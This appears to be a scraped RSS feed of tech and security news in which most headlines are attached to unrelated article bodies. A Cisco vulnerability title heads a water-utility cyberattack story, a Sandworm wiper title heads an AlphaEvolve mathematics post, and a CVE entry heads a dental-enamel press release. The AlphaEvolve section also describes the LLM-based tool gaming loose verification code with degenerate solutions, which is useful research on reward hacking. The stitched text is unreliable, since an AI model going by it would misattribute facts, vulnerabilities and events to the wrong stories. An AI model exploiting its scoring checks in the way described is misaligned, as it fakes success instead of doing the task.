a vegan (with the exception of a shitty Spanish restaurant that served me a plate of artichokes and nothing else) I eat a huge variety of species. Meat-eaters can eat these too but they often don’t because meat is so filling.]]></content:encoded></item><item><title>Cisco Unified Contact Center Express Vulnerabilities Let Remote Attacker Execute Malicious Code</title><link>https://cybersecuritynews.com/cisco-unified-contact-center-express-vulnerabilities/</link><author></author><category>security</category><pubDate>Thu, 6 Nov 2025 11:42:59 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Cisco Unified Contact Center Express Vulnerabilities Let Remote Attacker Execute Malicious Code

In August 2022, the Clop ransomware gang hit South Staffordshire Water, thinking that it was actually Thames Water. The attack focused on stealing customer data, meaning water supplies weren’t disrupted, although corporate systems were affected.In late 2023, pro-Iranian hackers disrupted water supplies in County Mayo, Ireland. The intruders, known as the Cyber Av2ngers group, caused outages across 160 homes for two days. The attack was politically motivated by the utility’s apparent use of an Israeli-made tool.These are far from the only attacks on water systems around the world. In February last year, CISA warned that a Chinese state-sponsored group had spent nine months moving laterally through a US water facility.In that incident, attackers gained access using an administrator’s login and spent months inside the infrastructure, nosing around databases and other assets. CISA linked the intrusion to Volt Typhoon—a group that also targeted telecommunications companies around the world. The attackers were described as “OT adjacent,” meaning they had reached administrative systems close enough to potentially impact the operational technology that controls water flow.The attacks keep coming. Just last month, the Canadian Centre for Cybersecurity reported an attack on a municipal water facility. Hacktivists managed to alter water pressure, causing “degraded service” for the local community.It’s always worrying when attackers target critical national infrastructure. When attackers hit Colonial Pipeline in 2021, they only compromised its administrative network (the part that handles paperwork). But the company was spooked enough that it shut down its fuel distribution systems too, as a protective measure, causing gasoline prices to spike across the US East Coast.A possible legal shake-upMany attacks on water systems might go unreported, depending on where they happen. The UK’s Network and Information Systems (NIS) regulations dictate that critical national infrastructure organizations should reveal cyber attacks to the public. However, that only applies if those attacks caused disruption.That’s why the attacks uncovered by Recorded Future haven’t been made public until now. While worrying, they didn’t affect the UK’s water supply. A 2022 review of the NIS regulations criticized this limited disclosure, noting that attacks with the potential to disrupt services often went unreported.Although the attacks reported to Recorded Future were voluntarily disclosed by the DWI by suppliers, upcoming legal changes could lower the bar for mandatory reporting. The UK’s proposed Cyber Security and Resilience Bill would expand disclosure requirements, increasing transparency about attacks that could affect the water supply. The Bill is expected to reach Parliament in 2025—though time is running short.A resource under pressureWater is under considerable threat already in the UK, with major droughts declared this year. The Met Office reports that this year’s February-to-April period was the driest since 1956, with rainfall at just half the long-term average. River flows have dropped sharply, soil moisture is down, and the National Drought Group has met to coordinate a national response.Water companies already have plans to manage shortages, the UK government says. But as the cyberattacks mount, the question is: are their system defenses strong enough too?We don’t just report on threats—we remove them]]></content:encoded></item><item><title>The trust collapse: Infinite AI content is awful</title><link>https://arnon.dk/the-trust-collapse-infinite-ai-content-is-awful/</link><author>arnon</author><category>dev</category><pubDate>Thu, 6 Nov 2025 10:12:04 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[We’re living through the weirdest moment in human history.For the first time since, well, ever, the cost of creating content has dropped to essentially zero. Not “cheaper than before”, but like actually free.It’s so easy to generate a thousand blog posts or ten thousand “””personalized””” emails and it barely costs you anything (for now).In theory this sounds great, infinite content. Giving words to those who struggled before.But if you’re trying to sell, trust is collapsing faster than content is proliferating.And I don’t mean “trust” in some abstract sense, but the real – who’s real, who’s credible, and what should I be paying attention to?We’re not moving forward. We’re definitely moving backwards.A tale of a B2B SaaS companyI know someone who runs a B2B SaaS company’s sales – he’s very smart. He spent many many years building his network and being a “relationship builder” type of seller – earning trust the old-fashioned way.When we spoke last Sunday, he told me “I ignore all email outreach, and I barely even pick up the phone if I don’t know who it is”“I can’t tell if it’s a real person or someone who’s scraped my details. I used to be able to tell. Now I can’t. So I just… don’t engage. Not worth my time.”To dumb it down for you if you’re doing this outbound – he’s not asking “do I need this product?” that you’re selling, but he’s asking “why should I trust  specifically to deliver it?” – and you’re not getting through with that.Marketing funnel? Nah. Meet the trust funnelIf being in marketing has taught me something, is that the “rules” and “playbooks” optimize for the wrong question – we craft positioning that explains  we do and  it matters.In many cases, your prospect already knows they need what you’re selling.They don’t need  pitch deck explaining why AI coding assistants increase developer productivity or why they can send more e-mails with an AI SDR.They’ve seen forty of those this month (can we talk about how many AI SDRs there are????)Honestly, this hurts saying too, but they don’t need proof that outcome-based pricing aligns incentives better than seat licenses. They read one of my 40 articles on the topic already.What they actually want to know is “why the hell would I buy it from  instead of the other hundred companies spamming my inbox with identical claims?”And because everything is AI slop now, answering that question became harder for them.If you haven’t heard already, here are the differences between a marketing funnel and a trust funnel:Lead generation and conversionsRelationship building and customer loyaltyOngoing customer advocacy and retentionPromotional, sales-focusedHelpful, customer-focused, value-drivenConversion rates, sales numbersSatisfaction, repeat business, advocacyLong-term, compounding trustIt’s clear that you need to be on that trust side!With normal marketing funnels, lead generation sucks nowWhen a Claude license is like, $10 a month – content creation costs are effectively zero. Now everyone can afford to  credible. Perfect grammar. Personalized outreach that references your LinkedIn posts (albeit badly).All of it can be generated in minutes, with no human intervention.Which means all of it is now suspect.I now send all e-mail AND LinkedIn messages to the trash.Why? Because I can actually tell they didn’t come from humans who care about me or my problem.This is the trust collapse for me: it’s not that I don’t believe your product works. I don’t believe you’re a real human who will still care after you sign the contract.Rates are down, I’ll just send more messagesCost to produce credible, personalized outreach: $50/hour (human labor)Volume of credible outreach a prospect receives: ~10/weekProspect’s ability to evaluate authenticity: Pattern recognition works ~80% of timeCost to produce credible, personalized outreach: effectively 0Volume of credible outreach a prospect receives: ~200/weekProspect’s ability to evaluate authenticity: Pattern recognition works ~20% of timeThe signal-to-noise ratio has hit a breaking point where the cost of verification exceeds the expected value of engagement.So prospects don’t verify. They just assume everything is noise. This is why I (and my friend) ignore all outreach, and I’m far from alone.The cognitive cost of determining “is this real?” for 200 messages exceeds the expected benefit of the 2-3 that  actually be valuable.You have to understand – your prospects aren’t asking:“Does your AI coding assistant work?” (They probably assume it does)“Will it actually improve {some metric}?” (They assume it will)“Is the pricing competitive?” (They can compare that in a spreadsheet)“Will you still be here in 12 months when I’ve integrated your tool into my workflow?”“Why are you actually better or different from the 5 others I know of?”“Are you burning VC cash on unsustainable unit economics?”“When the music stops, will I be left holding a broken integration?”“Have you actually figured out how to make money, or are you just another vibe-revenue vibe-coded startup hoping to flip before the math catches up to your credit usage?”And here’s the problem: they can’t tell if you don’t tell them.I’m not writing this to be cynical, but because I want to make sure you play the right game.Sure, you have to answer “why should I buy this product category?” but also “why should I buy it from ?” and your content and marketing has to match that.Your opportunity is huge. Here is what we all must do:Trust is still a human job: At least for now – AI may help you along the way but at least in 2025 only humans can build genuine emotional connection and credibility. You need that lasting loyalty and advocacy. Don’t rely on the so-called “personalized outbound” alone.Yes, relevance and customization are critical: AI should help you segment prospects meticulously and flag when human follow-up is likely to deepen trust, not just automate at scale. Use the outbound engine to be real.​Again, keep a human involved: Too much automation can undermine trust. I expect at least some human engagement, especially in complex or high-value sales contexts.​​Is this actually different now that we have AI?You’re representing a brand. And your brand must continuously earn that trust, even if you blend of AI-powered relevance. We still want that unmistakable human leadership.]]></content:encoded></item><item><title>Sandworm hackers use data wipers to disrupt Ukraine&apos;s grain sector</title><link>https://www.bleepingcomputer.com/news/security/sandworm-hackers-use-data-wipers-to-disrupt-ukraines-grain-sector/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 6 Nov 2025 10:01:28 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Russian state-backed hacker group Sandworm has deployed multiple data-wiping malware families in attacks targeting Ukraine's education, government, and the grain sector, the country's main revenue source.

AlphaEvolve is a variant of more traditional optimization tools that are designed to extremize some given score function over a high-dimensional space of possible inputs. A traditional optimization algorithm might evolve one or more trial inputs over time by various methods, such as stochastic gradient descent, that are intended to locate increasingly good solutions while trying to avoid getting stuck at local extrema. By contrast, AlphaEvolve does not evolve the score function inputs directly, but uses an LLM to evolve computer code (often written in a standard language such as Python) which will in turn be run to generate the inputs that one tests the score function on. This reflects the belief that in many cases, the extremizing inputs will not simply be an arbitrary-looking string of numbers, but will often have some structure that can be efficiently described, or at least approximated, by a relatively short piece of code. The tool then works with a population of relatively successful such pieces of code, with the code from one generation of the population being modified and combined by the LLM based on their performance to produce the next generation. The stochastic nature of the LLM can actually work in one’s favor in such an evolutionary environment: many “hallucinations” will simply end up being pruned out of the pool of solutions being evolved due to poor performance, but a small number of such mutations can add enough diversity to the pool that one can break out of local extrema and discover new classes of viable solutions. The LLM can also accept user-supplied “hints” as part of the context of the prompt; in some cases, even just uploading PDFs of relevant literature has led to improved performance by the tool. Since the initial release of AlphaEvolve, similar tools have been developed by others, including OpenEvolve, ShinkaEvolve and DeepEvolve.

We tested this tool on a large number (67) of different mathematics problems (both solved and unsolved) in analysis, combinatorics, and geometry that we gathered from the literature, and reported our outcomes (both positive and negative) in this paper. In many cases, AlphaEvolve achieves similar results to what an expert user of a traditional optimization software tool might accomplish, for instance in finding more efficient schemes for packing geometric shapes, or locating better candidate functions for some calculus of variations problem, than what was previously known in the literature. But one advantage this tool seems to offer over such custom tools is that of , particularly when when studying variants of a problem that we had already tested this tool on, as many of the prompts and verification tools used for one problem could be adapted to also attack similar problems; several examples of this will be discussed below.  The following graphic illustrates the performance of AlphaEvolve on this body of problems:

Another advantage of AlphaEvolve was : it was relatively easy to set up AlphaEvolve to work on a broad array of problems, without extensive need to call on domain knowledge of the specific task in order to tune hyperparameters. In some cases, we found that making such hyperparameters part of the data that AlphaEvolve was prompted to output was better than trying to work out their value in advance, although a small amount of such initial theoretical analysis was helpful. For instance, in calculus of variation problems, one is often faced with the need to specify various discretization parameters in order to estimate a continuous integral, which cannot be computed exactly, by a discretized sum (such as a Riemann sum), which can be evaluated by computer to some desired precision. We found that simply asking AlphaEvolve to specify its own discretization parameters worked quite well (provided we designed the score function to be conservative with regards to the possible impact of the discretization error); see for instance this experiment in locating the best constant in functional inequalities such as the Hausdorff-Young inequality.

A third advantage of AlphaEvolve over traditional optimization methods was the  of many of the solutions provided. For instance, in one of our experiments we sought to find an extremum to a functional inequality such as the Gagliardo–Nirenberg inequality (a variant of the Sobolev inequality). This is a relatively well-behaved optimization problem, and many standard methods can be deployed to obtain near-optimizers that are presented in some numerical format, such as a vector of values on some discretized mesh of the domain. However, when we applied AlphaEvolve to this problem, the tool was able to discover the exact solution (in this case, a Talenti function), and create code that sampled from that function on a discretized mesh to provide the required input for the scoring function we provided (which only accepted discretized inputs, due to the need to compute the score numerically). This code could be inspected by humans to gain more insight as to the nature of the optimizer. (Though in some cases, AlphaEvolve’s code would contain some brute force search, or a call to some existing optimization subroutine in one of the libraries it was given access to, instead of any more elegant description of its output.)

For problems that were sufficiently well-known to be in the training data of the LLM, the LLM component of AlphaEvolve often came up almost immediately with optimal (or near-optimal) solutions. For instance, for variational problems where the gaussian was known to be the extremizer, AlphaEvolve would frequently guess a gaussian candidate during one of the early evolutions, and we would have to obfuscate the problem significantly to try to conceal the connection to the literature in order for AlphaEvolve to experiment with other candidates. AlphaEvolve would also propose similar guesses for other problems for which the extremizer was not known. For instance, we tested this tool on the sum-difference exponents of relevance to the arithmetic Kakeya conjecture, which can be formulated as a variational entropy inequality concerning certain two-dimensional discrete random variables. AlphaEvolve initially proposed some candidates for such variables based on discrete gaussians, which actually worked rather well even if they were not the exact extremizer, and already generated some slight improvements to previous lower bounds on such exponents in the literature. Inspired by this, I was later able to rigorously obtain some theoretical results on the asymptotic behavior on such exponents in the regime where the number of slopes was fixed, but the “rational complexity” of the slopes went to infinity; this will be reported on in a separate paper.

Perhaps unsurprisingly, AlphaEvolve was extremely good at locating “exploits” in the verification code we provided, for instance using degenerate solutions or overly forgiving scoring of approximate solutions to come up with proposed inputs that technically achieved a high score under our provided code, but were not in the spirit of the actual problem. For instance, when we asked it (link under construction) to find configurations to extremal geometry problems such as locating polygons with each vertex having four equidistant other vertices, we initially coded the verifier to accept distances that were equal only up to some high numerical precision, at which point AlphaEvolve promptly placed many of the points in virtually the same location so that the distances they determined were indistinguishable. Because of this, a non-trivial amount of human effort needs to go into designing a non-exploitable verifier, for instance by working with exact arithmetic (or interval arithmetic) instead of floating point arithmetic, and taking conservative worst-case bounds in the presence of uncertanties in measurement to determine the score. For instance, in testing AlphaEvolve against the “moving sofa” problem and its variants, we designed a conservative scoring function that only counted those portions of the sofa that we could definitively prove to stay inside the corridor at all times (not merely the discrete set of times provided by AlphaEvolve to describe the sofa trajectory) to prevent it from exploiting “clipping” type artefacts. Once we did so, it performed quite well, for instance rediscovering the optimal “Gerver sofa” for the original sofa problem, and also discovering new sofa designs for other problem variants, such as a 3D sofa problem.

For well-known open conjectures (e.g., Sidorenko’s conjecture, Sendov’s conjecture, Crouzeix’s conjecture, the ovals problem, etc.), AlphaEvolve generally was able to locate the previously known candidates for optimizers (that are conjectured to be optimal), but did not locate any stronger counterexamples: thus, we did not disprove any major open conjecture. Of course, one obvious possible explanation for this is that these conjectures are in fact true; outside of a few situations where there is a matching “dual” optimization problem, AlphaEvolve can only provide one-sided bounds on such problems and so cannot definitively determine if the conjectural optimizers are in fact the true optimizers. Another potential explanation is that AlphaEvolve essentially tried all the “obvious” constructions that previous researchers working on these problems had also privately experimented with, but did not report due to the negative findings. However, I think there is at least value in using these tools to systematically record negative results (roughly speaking, that a search for “obvious” counterexamples to a conjecture did not disprove the claim), which currently only exist as “folklore” results at best. This seems analogous to the role LLM Deep Research tools could play by systematically recording the results (both positive and negative) of automated literature searches, as a supplement to human literature review which usually reports positive results only. Furthermore, when we shifted attention to less well studied variants of famous conjectures, we were able to find some modest new observations. For instance, while AlphaEvolve only found the standard conjectural extremizer  to Sendov’s conjecture, as well as for variants such as Borcea’s conjecture, Schmeisser’s conjecture, or Smale’s conjecture it did reveal some potential two-parameter extensions to a conjecture of de Bruin and Sharma that had not previously been stated in the literature. (For this problem, we were not directly optimizing some variational scalar quantity, but rather a two-dimensional range of possible values, which we could adapt the AlphaEvolve framework to treat). In the future, I can imagine such tools being a useful “sanity check” when proposing any new conjecture, in that it will become common practice to run one of these tools against such a conjecture to make sure there are no “obvious” counterexamples (while keeping in mind that this is still far from conclusive evidence in favor of such a conjecture).

AlphaEvolve did not perform equally well across different areas of mathematics. When testing the tool on analytic number theory problems, such as that of designing sieve weights for elementary approximations to the prime number theorem, it struggled to take advantage of the number theoretic structure in the problem, even when given suitable expert hints (although such hints have proven useful for other problems). This could potentially be a prompting issue on our end, or perhaps the landscape of number-theoretic optimization problems is less amenable to this sort of LLM-based evolutionary approach. On the other hand, AlphaEvolve does seem to do well when the constructions have some algebraic structure, such as with the finite field Kakeya and Nikodym set problems, which we will turn to shortly.

For many of our experiments we worked with fixed-dimensional problems, such as trying to optimally pack  shapes in a larger shape for a fixed value of . However, we found in some cases that if we asked AlphaEvolve to give code that took parameters such as  as input, and tested the output of that code for a suitably sampled set of values of  of various sizes, then it could sometimes generalize the constructions it found for small values of this parameter to larger ones; for instance, in the infamous sixth problem of this year’s IMO, it could use this technique to discover the optimal arrangement of tiles, which none of the frontier models could do at the time (although AlphaEvolve has no capability to demonstrate that this arrangement was, in fact, optimal). Another productive use case of this technique was for finding finite field Kakeya and Nikodym sets of small size in low-dimensional vector spaces over finite fields of various sizes. For Kakeya sets in , it located the known optimal construction based on quadratic residues in two dimensions, and very slightly beat (by an error term of size ) the best construction in three dimensions; this was an algebraic construction (still involving quadratic residues) discovered empirically that we could then prove to be correct by first using Gemini’s “Deep Think” tool to locate an informal proof, which we could then convert into a formalized Lean proof by using Google Deepmind’s “AlphaProof” tool. At one point we thought it had found a construction in four dimensions which achieved a more noticeable improvement (of order ) of what we thought was the best known construction, but we subsequently discovered that essentially the same construction had appeared already in a paper of Bukh and Chao, although it still led to a more precise calculation of the error term (to accuracy  rather than , where the error term now involves the Lang-Weil inequality and is unlikely to have a closed form). Perhaps AlphaEvolve had somehow absorbed the Bukh-Chao construction within its training data to accomplish this. However, when we tested the tool on Nikodym sets (which are expected to have asymptotic density , although this remains unproven), it did find some genuinely new constructions of such sets in three dimensions, based on removing quadratic varieties from the entire space. After using “Deep Think” again to analyze these constructions, we found that they were inferior to a purely random construction (which in retrospect was an obvious thing to try); however, they did inspire a hybrid construction in which one removed random quadratic varieties and performed some additional cleanup, which ends up outperforming both the purely algebraic and purely random constructions. This result (with completely human-generated proofs) will appear in a subsequent paper.

The idea is to achieve deep integration with everything I do on a computer, to the degree my thoughts are immediately able to be acted upon in the buffer.I use hyprland as my window manager, and while I have heard of other managers/DEs (I was using GNOME for the better part of 6 months), I keep coming back to hyprland just because it works and is easy to configure. Also, for some reason, I seem not to have lagging in emacs on wayland in hyprland, while I had to previously run emacs in X11 mode in GNOME, go figure.I have seen what people are capable of doing when their tools get out of the way, and they are free to just .
This is how world class athletes, musicians, artists, writers, and of course programmers take what is in their mind and translate it into reality.
The idea is that if I can learn this “editor of a lifetime” - then the things that I want to create, the programs I want to write, will be achieved in a near frictionless environment, allowing for velocity that is not possible elsewhere.
It is the ultimate sharpening of the axe before chopping the tree.I have considered using EXWM as the window manager (quite literally offloading window management to emacs, and “living in emacs” - to more of a degree than I do already), the hesitation I have is that:Emacs is single threaded, therefore if anything in the system hangs, the whole system hangs, andIt is only X11 where most of the development and forward movement in the linux space has been in wayland. While I understand this is not a tremendous issue, wayland does seem to be where the puck is going.So, what I am aiming to do is replicate functionality as best as I can from EXWM to a wayland environment - not wholly possible, but also not wholly impossible, either.The Emacs Launcher programIf you look at my dotfiles, you can see I have a script written in Go that allows me to call each and every one of my emacs controls anywhere is my system.
I was previously calling each of these emacs commands in bash and with a sleep command so as to make sure I was targeting the emacs instance. No longer. This Go script has sped up my workflow by 10x.bind = $mainMod SHIFT, E, exec, bash -c "emacs"I almost never press this keybind, as emacs is opened from the get-go in my hyprland sessions.  For that rare time I need to re-open it.Opening vterm as my default terminalbind = $mainMod, E, exec, emacsclient -n -e '(my/new-frame-with-vterm)'This permits me to quickly open a vterm window and enter commands etc. If I need anything that is more graphically intense, I fallback to kitty terminal, but this is less and less these days.Opening vterm in my emacs session quickly for in projects is done like so:bind = $mainMod, RETURN, exec, ~/.config/hypr/scripts/emacs-launcher '(my-open-vterm-at-point)'bind = $mainMod, SPACE, exec, ~/.config/hypr/scripts/emacs-launcher '(progn (select-frame-set-input-focus (selected-frame)) (universal-launcher-popup))'I wanted to replicate a launcher (similar to wofi/rofi) in which I could easily launch apps and switch to them in the environment.So, my take on this is to replace wofi with this functionality.

Cloudflare responded by redacting Aisuru domain names from their top websites list. The chief executive at Cloudflare says Aisuru’s overlords are using the botnet to boost their malicious domain rankings, while simultaneously attacking the company’s domain name system (DNS) service.The #1 and #3 positions in this chart are Aisuru botnet controllers with their full domain names redacted. Source: radar.cloudflare.com.Until recently, Aisuru’s malicious code instructed all infected systems to use DNS servers from Google — specifically, the servers at 8.8.8.8. But in early October, Aisuru switched to invoking Cloudflare’s main DNS server — 1.1.1.1 — and over the past week domains used by Aisuru to control infected systems started populating Cloudflare’s top domain rankings.As screenshots of Aisuru domains claiming two of the Top 10 positions ping-ponged across social media, many feared this was yet another sign that an already untamable botnet was running completely amok. One Aisuru botnet domain that sat prominently for days at #1 on the list was someone’s street address in Massachusetts followed by “.com”. Other Aisuru domains mimicked those belonging to major cloud providers.Cloudflare tried to address these security, brand confusion and privacy concerns by partially redacting the malicious domains, and adding a warning at the top of its rankings:“Note that the top 100 domains and trending domains lists include domains with organic activity as well as domains with emerging malicious behavior.”Cloudflare CEO  told KrebsOnSecurity the company’s domain ranking system is fairly simplistic, and that it merely measures the volume of DNS queries to 1.1.1.1.“The attacker is just generating a ton of requests, maybe to influence the ranking but also to attack our DNS service,” Prince said, adding that Cloudflare has heard reports of other large public DNS services seeing similar uptick in attacks. “We’re fixing the ranking to make it smarter. And, in the meantime, redacting any sites we classify as malware.”, vice president of threat intel at the DNS security firm , said many people erroneously assumed that the skewed Cloudflare domain rankings meant there were more bot-infected devices than there were regular devices querying sites like Google and Apple and Microsoft.“Cloudflare’s documentation is clear — they know that when it comes to ranking domains you have to make choices on how to normalize things,” Burton wrote on . “There are many aspects that are simply out of your control. Why is it hard? Because reasons. TTL values, caching, prefetching, architecture, load balancing. Things that have shared control between the domain owner and everything in between.” is CEO of the anti-phishing and security firm . Greenland said he understands the technical reason why Aisuru botnet domains are showing up in Cloudflare’s rankings (those rankings are based on DNS query volume, not actual web visits). But he said they’re still not meant to be there.“It’s a failure on Cloudflare’s part, and reveals a compromise of the trust and integrity of their rankings,” he said.Greenland said Cloudflare planned for its Domain Rankings to list the most popular domains as used by human users, and it was never meant to be a raw calculation of query frequency or traffic volume going through their 1.1.1.1 DNS resolver.“They spelled out how their popularity algorithm is designed to reflect real human use and exclude automated traffic (they said they’re good at this),” Greenland wrote on LinkedIn. “So something has evidently gone wrong internally. We should have two rankings: one representing trust and real human use, and another derived from raw DNS volume.”Why might it be a good idea to wholly separate malicious domains from the list? Greenland notes that Cloudflare Domain Rankings see widespread use for trust and safety determination, by browsers, DNS resolvers, safe browsing APIs and things like TRANCO.“TRANCO is a respected open source list of the top million domains, and Cloudflare Radar is one of their five data providers,” he continued. “So there can be serious knock-on effects when a malicious domain features in Cloudflare’s top 10/100/1000/million. To many people and systems, the top 10 and 100 are naively considered safe and trusted, even though algorithmically-defined top-N lists will always be somewhat crude.”Over this past week, Cloudflare started redacting portions of the malicious Aisuru domains from its Top Domains list, leaving only their domain suffix visible. Sometime in the past 24 hours, Cloudflare appears to have begun hiding the malicious Aisuru domains entirely from the web version of that list. However, downloading a spreadsheet of the current Top 200 domains from Cloudflare Radar shows an Aisuru domain still at the very top.According to Cloudflare’s website, the majority of DNS queries to the top Aisuru domains — nearly 52 percent — originated from the United States. This tracks with my reporting from early October, which found Aisuru was drawing most of its firepower from IoT devices hosted on U.S. Internet providers like ,  and .Experts tracking Aisuru say the botnet relies on well more than a hundred control servers, and that for the moment at least most of those domains are registered in the .su top-level domain (TLD). Dot-su is the TLD assigned to the former Soviet Union (.su’s Wikipedia page says the TLD was created just 15 months before the fall of the Berlin wall).A Cloudflare blog post from October 27 found that .su had the highest “DNS magnitude” of any TLD, referring to a metric estimating the popularity of a TLD based on the number of unique networks querying Cloudflare’s 1.1.1.1 resolver. The report concluded that the top .su hostnames were associated with a popular online world-building game, and that more than half of the queries for that TLD came from the United States, Brazil and Germany [it’s worth noting that servers for the world-building game  were some of Aisuru’s most frequent targets].A simple and crude way to detect Aisuru bot activity on a network may be to set an alert on any systems attempting to contact domains ending in .su. This TLD is frequently abused for cybercrime and by cybercrime forums and services, and blocking access to it entirely is unlikely to raise any legitimate complaints.]]></content:encoded></item><item><title>ISC Stormcast For Thursday, November 6th, 2025 https://isc.sans.edu/podcastdetail/9688, (Thu, Nov 6th)</title><link>https://isc.sans.edu/diary/rss/32456</link><author></author><category>threatintel</category><pubDate>Thu, 6 Nov 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-64164 - DataEase is vulnerable to Oracle JNDI Injection</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64164</link><author></author><category>vulns</category><pubDate>Thu, 6 Nov 2025 01:15:38 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64164

The findings have been published today in Nature Communications.The gel can be rapidly applied to teeth in the same way dentists currently apply standard fluoride treatments. However, this new protein-based gel is fluoride free and works by mimicking key features of the natural proteins that guide the growth of dental enamel in infancy. When applied, the gel creates a thin and robust layer that impregnates teeth, filling holes and cracks in them. It then functions as a scaffold that takes calcium and phosphate ions from saliva and promotes the controlled growth of new mineral in a process called epitaxial mineralization. This enables the new mineral to be organized and integrated to the underlying natural tissue while recovering both the structure and properties of natural healthy enamel.The new material can also be applied on top of exposed dentine, growing an enamel-like layer on top of dentine, which has many benefits including treating hypersensitivity or enhancing the bonding of dental restorations.Enamel degradation is a major contributor to tooth decay and is associated to dental problems affecting almost 50% of the world’s population. These problems can lead to infections and tooth loss, and can also be associated with conditions such as diabetes and cardiovascular disease. Enamel does not naturally regenerate; once you lose it is gone forever. There is currently no solution available that can effectively regrow enamel. Current treatments such as fluoride varnishes and remineralisation solutions only alleviate the symptoms of lost enamel.Dr Abshar Hasan, a Postdoctoral Fellow and leading author of the study, said: “Dental enamel has a unique structure, which gives enamel its remarkable properties that protect our teeth throughout life against physical, chemical, and thermal insults. When our material is applied to demineralized or eroded enamel, or exposed dentine, the material promotes the growth of crystals in an integrated and organized manner, recovering the architecture of our natural healthy enamel."
                        We have tested the mechanical properties of these regenerated tissues under conditions simulating ‘real-life situations’ such as tooth brushing, chewing, and exposure to acidic foods, and found that the regenerated enamel behaves just like healthy enamel.
                        
                        We are very excited because the technology has been designed with the clinician and patient in mind. It is safe, can be easily and rapidly applied, and it is scalable. Also, the technology is versatile, which opens the opportunity to be translated into multiple types of products to help patients of all ages suffering from a variety of dental problems associated with loss of enamel and exposed dentine. We have started this process with our start-up company Mintech-Bio and hope to have a first product out next year; this innovation could soon be helping patients worldwide.

But you still only have one instruction decoding block and it is hard to get it to go fast, so the arithmetic hardware is vastly underutilized.To get around the instruction decoding bottleneck, you can feed the CPU a batch of numbers all at once for a single arithmetic operation like addition. Hence the name: “single instruction, multiple data,” or SIMD for short.Instead of adding two numbers together, you can add two batches or “vectors” of numbers and it takes about the same amount of time.On recent x86 chips these batches can be up to 512 bits in size, so in theory you can get an 8x speedup for math on  or a 64x speedup on !Historically, SIMD instructions were added after the CPU architecture was already designed, so SIMD is an extension with its own marketing name on each architecture.ARM calls theirs “NEON”, and all 64-bit ARM CPUs have it.WebAssembly doesn’t have a marketing department, so they just call theirs “WebAssembly 128-bit packed SIMD extension”.64-bit x86 shipped with one called “SSE2” which has basic instructions for 128-bit vectors, but  they added a whole menagerie of extensions on top of that, with SSE 4.2 adding more operations, AVX and AVX2 adding 256-bit vectors and AVX-512 adding 512-bit vectors.The word “later” in the above paragraph creates a problem.Does this CPU have that instruction?If you’re running a program on an x86 CPU, it’s not a given that the CPU has any particular SIMD extension. So by default the compiler isn’t allowed to use instructions beyond SSE2 because that won’t work on all x86 CPUs.There are two ways around this problem.If you work for a company that only ever runs their binaries on their own servers or on a public cloud, you can just assert that they’re all recent enough to at least have AVX2 that was introduced over 10 years ago, and have the program crash or misbehave if it ever runs on anything without AVX2:However, if you are distributing the binaries for other people to run, that’s not really an option.Instead you can do something called function multiversioning: compile the same function multiple times for different SIMD extensions, and when the program actually runs, check what features the CPU supports and select the appropriate version based on that.Fortunately, this problem only exists on x86.ARM made its NEON mandatory in all 64-bit CPUs and then didn’t bother expanding the width beyond 128 bits. (Technically SVE exists, but in 2025 it is still mostly on paper, and Rust support for it is still in progress).WebAssembly makes you compile two different binaries, one with SIMD and one without, and use JavaScript to check if the browser supports SIMD.There are four approaches to SIMD in Rust, in ascending order of effort:Portable SIMD abstractionsThe easiest approach to SIMD is letting the compiler do it for you.It works surprisingly well, as long as you structure your code in a way that is amenable to vectorization. This article covers it:You can check if it’s working with cargo-show-asm or godbolt.org, but your benchmarks are the ultimate judge of the results.Sadly there is a limit on the complexity of the code that the compiler will vectorize, and it may change between compiler versions. If something vectorizes today that doesn’t necessarily mean it still will in a year from now.The other drawback of this method is that the optimizer won’t even touch anything involving floats ( and  types). It’s not permitted to change any observable outputs of the program, and reordering float operations may alter the result due to precision loss. (There is a way to tell the compiler not to worry about precision loss, but it’s currently nightly-only).So right now, if you need to process floats, autovectorization is a no-go unless you can use nightly builds of the Rust compiler.(Floats are cursed even without SIMD. Something as simple as summing an array of them in a usable way turns out to be really hard).There is no built-in way to multiversion functions, but the multiversion crate works great with autovectorization.Just like rayon lets you run your iterators in parallel by swapping  with , there have been attempts to do the same for SIMD. After all, what is SIMD but another kind of parallelism?This is the approach that the faster crate takes. That crate has been abandoned for years, and it doesn’t look like this approach has panned out.Portable SIMD abstractionsThe idea is to let you write your algorithm by explicitly operating on chunks of data, something like  but wrapped in a custom type, and then provide custom implementations of operations like  that compile down into SIMD instructions. is exactly that. It supports all instruction sets LLVM supports, so its platform support is unparalleled. It pairs well with the multiversion crate. Sadly it’s  and will remain such for the foreseeable future, so it’s unusable in most situations.The wide crate is a mature, established option. It supports NEON, WASM and all the x86 instruction sets. But it doesn’t support multiversioning at all, save for very exotic and limited approaches like cargo-multivers.The pulp crate has built-in multiversioning, and is reasonably mature and complete, if not as much as . It powers faer, so its performance is clearly proven. A major limitation is that it only operates on the native SIMD width, so you need your code to be able to handle variable width chunks as opposed to expressing everything in terms of something like  and letting the library lower it into the appropriate instructions like  and  do. And it’s difficult to write code that’s generic over type, so if you want both  and  there will be some code duplication. The architecture support is also limited — only NEON, AVX2 and AVX-512. AVX2 was introduced in 2012, but in the Firefox hardware survey only 75% of systems have it.The macerator crate is a fork of pulp with better support for generic programming and vastly expanded instruction set support. It supports all x86 extensions, WASM, NEON, and even the LoongArch SIMD extensions. It also improves on  for generic programming. It’s used only by burn-ndarray, and even there it’s an optional dependency. It sounds great on paper, but it’s oddly obscure and therefore unproven.The fearless_simd crate is inspired by pulp’s design, but also supports fixed-size chunks just like  and . It’s far less mature than pulp, but it’s under active development. As of this writing it supports NEON, WASM and SSE4.2, but not the newer x86 extensions. Seems too immature just yet, but something to keep an eye on.simdeez is a rather old crate that supports all instruction sets except AVX-512 and comes with built-in multiversioning. What gives me pause is that despite existing for many years, it’s still barely used. Everyone else who needed SIMD built their own instead of using it. And its README says:Currently things are well fleshed out for i32, i64, f32, and f64 types.So I guess the other types aren’t complete? use  if you 